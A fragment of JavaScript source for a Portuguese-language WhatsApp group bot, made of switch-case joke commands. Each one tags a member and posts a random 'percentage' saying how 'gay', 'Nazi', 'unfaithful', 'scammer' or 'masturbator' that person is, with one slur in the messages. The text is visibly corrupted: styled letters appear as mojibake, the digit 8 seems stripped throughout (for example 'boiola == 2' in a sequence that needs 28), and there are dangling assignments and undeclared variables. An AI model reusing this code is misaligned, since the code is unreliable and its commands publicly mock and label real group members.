if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ‚ù∞ Pesquisando a sua ficha de gostoso : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gostosin}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `‚Ä¢ O quanto voce e gostoso üòè\n\n‚ßº @${blamention_id.split("@")[0]} ‚ßΩ voce eÃÅ: ‚ù∞ ${random}% ‚ù± gostosoü•µ\n‚Ä¢ Que isso ta gostos√£o üòà`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 
case 'fiel':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ‚ù∞ Pesquisando a sua ficha de fiel : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${fiel}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `‚Ä¢ O quanto que voce e fiel üòá\n\n‚ßº @${blamention_id.split("@")[0]} ‚ßΩ voce eÃÅ: ‚ù∞ ${random}% ‚ù± fiel ‚ù£Ô∏è\n‚Ä¢ Meus parab√©ns  fiel`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 

case 'gostosa':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ‚ù∞ Pesquisando a sua ficha de gostosa : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gostosinha}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `‚Ä¢ O quanto voce e gostosa üòè\n\n‚ßº @${blamention_id.split("@")[0]} ‚ßΩ Voce e ÃÅ: ‚ù∞ ${random}% ‚ù± gostosa ü•µ\n‚Ä¢ Que isso ta gostosona üòà`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break 

case 'infiel':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ‚ù∞ Pesquisandoa a sua ficha de infiel : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${infiel}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `‚Ä¢ O quanto voceÃÇ eÃÅ infiel üòë\n\n‚ßº @${blamention_id.split("@")[0]} ‚ßΩ Voce e : ‚ù∞ ${random}% ‚ù± infiel üòà`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break 

case 'gay2':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (!isGroup) return reply(msg.grupo)
rate = body.slice(7)
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

zxzz = 
random = `${Math.floor(Math.random() * 110)}`
random2 = `${Math.floor(Math.random() * 110)}`
amy.sendMessage(from, {text: `‚ûÆ Pesquisando a sua ficha de  ${comando} :  @${blamention_id.split("@")[0]}, aguarde...\n\n Voce e ÃÅ: ‚ù∞ ${random},${random2}% ‚ù±  ${comando}_ `, mentions: [blamention_id]})
break

case 'gay':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if(!isGroup) return reply('ùôéùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôöùô®ùô©ùôö ùôòùô§ùô¢ùôñùô£ùôôùô§, ùôöùô¢ ùôúùôßùô™ùô•ùô§.')

if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

amy.sendMessage(from, {text: `‚ù∞ Pesquisando a sua ficha de gay : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gayzin}`)
zxzz = 
random = `${Math.floor(Math.random() * 110)}`
feio = random
boiola = random
if (boiola < 20 ) {var bo = 'ùôùùô¢ùô¢... ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùôùùôöùô©ùôöùôßùô§üòî'} else if (boiola == 21 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 23 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 24 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 25 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 26 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 27 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 2 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 29 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 30 ) {var bo = '+/- ùôóùô§ùôûùô§ùô°ùôñ'} else if (boiola == 31 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ...üòë'} else if (boiola == 32 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ...üòë'} else if (boiola == 33 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ...üòë'} else if (boiola == 34 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ...üòë'} else if (boiola == 35 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ...üòë'} else if (boiola == 36 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ ...üòë'} else if (boiola == 37 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ ...üòë'} else if (boiola == 3 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ...üòë'} else if (boiola == 39 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ...üòë'} else if (boiola == 40 ) {var bo = 'ùô©ùôöùô£ùôùùô§ ùô¢ùôûùô£ùôùùôñ ùôôùôöùô®ùôòùô§ùô£ùôõùôûùôñùô£ùôòÃßùôñ ...üòë'} else if (boiola == 41 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 42 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 43 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 44 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 45 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 46 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 47 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 4 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 49 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô£ùôöÃÅ?üòè'} else if (boiola == 50 ) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùô§ùô™ ùô£ùôñÃÉùô§?üßê'} else if (boiola > 51) {var bo = 'ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùôúùôñùôÆüôà'
}
await amy.sendMessage(from, {image: wew, caption: `O quanto que voce e gay: \n\n „Äå @${blamention_id.split("@")[0]} „ÄçVoce eÃÅ: ‚ù∞ ${random}% ‚ù± gay üè≥Ô∏è‚Äçüåà\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: info})
}, 7000)
break

case 'nazista':
if(!isGroup) return reply(msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
async function nazistaMsg() {
random = `${Math.floor(Math.random() * 110)}`
nazistakjk = random
nazista = random
if(nazista <= 15 ) {var trai = 'hmm, parece q voc√™ n√£o √© nazista'}
else if(nazista == 16 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 17 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 18 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 19 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 20 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 21 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 22 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 23 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 24 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 25 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 26 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 27 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 28 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 29 ) {var nazi = 'tenho minha desconfian√ßa ü§®'}
else if(nazista == 30 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 31 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 32 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 33 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 34 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 35 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 36 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 37 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 38 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 39 ) {var nazi = 'voc√™ √© um pouco nazista üò∂'}
else if(nazista == 40 ) {var nazi = 'ü´£'}
else if(nazista == 41 ) {var nazi = 'ü´£'}
else if(nazista == 42 ) {var nazi = 'ü´£'}
else if(nazista == 43 ) {var nazi = 'ü´£'}
else if(nazista == 44 ) {var nazi = 'ü´£'}
else if(nazista == 45 ) {var nazi = 'ü´£'}
else if(nazista == 46 ) {var nazi = 'ü´£'}
else if(nazista == 47 ) {var nazi = 'ü´£'}
else if(nazista == 48 ) {var nazi = 'ü´£'}
else if(nazista == 49 ) {var nazi = 'ü´£'}
else if(nazista == 50 ) {var nazi = 'ü´£'}
else if(nazista == 51 ) {var nazi = 'ü´£'}
else if(nazista == 52 ) {var nazi = 'ü´£'}
else if(nazista == 53 ) {var nazi = 'ü´£'}
else if(nazista == 54 ) {var nazi = 'ü´£'}
else if(nazista == 55 ) {var nazi = 'ü´£'}
else if(nazista == 56 ) {var nazi = 'ü´£'}
else if(nazista == 57 ) {var nazi = 'ü´£'}
else if(nazista == 58 ) {var nazi = 'ü´£'}
else if(nazista == 59 ) {var nazi = 'ü´£'}
else if(nazista == 60 ) {var nazi = 'üò≥'}
else if(nazista == 61 ) {var nazi = 'üò≥'}
else if(nazista == 62 ) {var nazi = 'üò≥'}
else if(nazista == 63 ) {var nazi = 'üò≥'}
else if(nazista == 64 ) {var nazi = 'üò≥'}
else if(nazista == 65 ) {var nazi = 'üò≥'}
else if(nazista == 66 ) {var nazi = 'üò≥'}
else if(nazista == 67 ) {var nazi = 'üò≥'}     
else if(nazista == 68 ) {var nazi = 'üò≥'}     
else if(nazista == 69 ) {var nazi = 'üò≥'}     
else if(nazista == 70 ) {var nazi = 'üò≥'}    
else if(nazista == 71 ) {var nazi = 'üò≥'}    
else if(nazista == 72 ) {var nazi = 'üò≥'}     
else if(nazista == 73 ) {var nazi = 'üò≥'}     
else if(nazista == 74 ) {var nazi = 'üò≥'}     
else if(nazista == 75 ) {var nazi = 'üò≥'}
else if(nazista == 76 ) {var nazi = 'üò≥'}
else if(nazista == 77 ) {var nazi = 'üò≥'}
else if(nazista == 78 ) {var nazi = 'üò≥'}
else if(nazista == 79 ) {var nazi = 'üò≥'}
else if(nazista == 80 ) {var nazi = 'üò≥'}
else if(nazista == 81 ) {var nazi = 'üò≥'}
else if(nazista == 82 ) {var nazi = 'üò≥'}
else if(nazista == 83 ) {var nazi = 'üò≥'}
else if(nazista == 84 ) {var nazi = 'üò≥'}
else if(nazista >= 85 ) {var nazi = '...'}
var sandrokjk = [
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã0%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã10%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã20%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã30%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã40%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí„Äã50%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí„Äã60%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí„Äã70%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí„Äã80%*`,
`*ùöôùöéùöúùööùöûùöíùöúùöäùöóùöçùöò...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí„Äã90%*`,
`*ùöåùöòùöñùöôùöïùöéùöùùöò*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà„Äã100%*`,
`*O quanto voc√™ √© nazista?*\n\n*„Äå @${sender_ou_n.split("@")[0]} „Äçseu n√≠vel de nazista √©: ‚ù∞ ${random}% ‚ù±*\n\n*${nazi}*`
]
let { key } = await amy.sendMessage(from, {text: `‚ù∞ Pesquisando a sua ficha de nazista: „Äå @${sender_ou_n.split("@")[0]} „Äç aguarde...  ‚ù±`, mentions: [sender_ou_n]}, {quoted: info})
setTimeout(async() => {
for (let i = 0; i < sandrokjk.length; i++) 
await amy.sendMessage(from, {text: sandrokjk[i], mentions: [sender_ou_n], edit: key });
}, 1500)
}
nazistaMsg()
break


case 'alma-gemeas':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
membr = []
const suamae121 = groupMembers
const suamae251 = groupMembers
const teupai117 = suamae121[Math.floor(Math.random() * suamae121.length)]
const teupai251 = suamae251[Math.floor(Math.random() * suamae251.length)]
var shipted11 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipteddd = shipted11[Math.floor(Math.random() * shipted11.length)]
jet = `*Hmmm....  alma-gemeas eles 2 üíòüíò*\n\n1= @${teupai117.id.split('@')[0]}\ne esse\n2= @${teupai251.id.split('@')[0]}\ncom uma porcentagem de: ${shipteddd}`
membr.push(teupai117.id)
membr.push(teupai251.id)
mentions(jet, membr, true)
break


case 'punheteiro':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (!isGroup) return reply(`S√≥ pode ser utilizado este comando, em grupo.`)
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
const aletl = `${Math.floor(Math.random() * 105)}`
reply(`@${blamention_id.split("@")[0]} Aguarde, confiscando sua porcentagem...`)
await delay(7000)
reply(`„Äå @${blamention_id.split("@")[0]} „ÄçSua Porcentagem De punheteiro √© De : ${aletl}%`)
break

case 'dogolpe':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if(!menc_os2 || menc_jid2[1]) return reply('Marque a mensagem com o comando ou marque o @ do usu√°rio..')
random = `${Math.floor(Math.random() * 100)}`
amy.sendMessage(from, {text:`üö® Golpista localizado: *@${menc_os2.split("@")[0]}*\n‚Äî *Porcentagem de golpe:* ${random}%\n*Aviso:* _Ele(a) gosta de ferir sentimentos.._`, mentions: [menc_os2]})
break

case 'maconheiro': case 'maconheira':
if(!isGroup) return reply(`S√≥ pode ser utilizado este comando, em grupo.`)
